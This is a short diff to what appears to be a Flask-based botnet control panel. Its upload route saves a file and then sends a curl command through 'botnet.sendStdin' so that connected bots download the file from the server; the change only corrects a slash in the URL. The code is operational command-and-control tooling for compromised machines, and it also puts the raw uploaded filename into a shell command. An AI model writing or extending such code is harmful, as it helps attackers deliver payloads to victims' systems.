@@ -55,7 +55,7 @@ def upload_file():
         filename = secure_filename(f.filename)
         location = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         f.save(location)
-        if botnet.sendStdin(connected, 'curl {}/static/uploads/{} -o {}\n'.format(request.url_root ,f.filename, f.filename)):
+        if botnet.sendStdin(connected, 'curl {}static/uploads/{} -o {}\n'.format(request.url_root ,f.filename, f.filename)):
             # os.remove(location) #TODO: Should probably remove file but need more elegant way to do so in order to avoid race condition
             return json.dumps({"success": True})
         else: return json.dumps({"success": False})
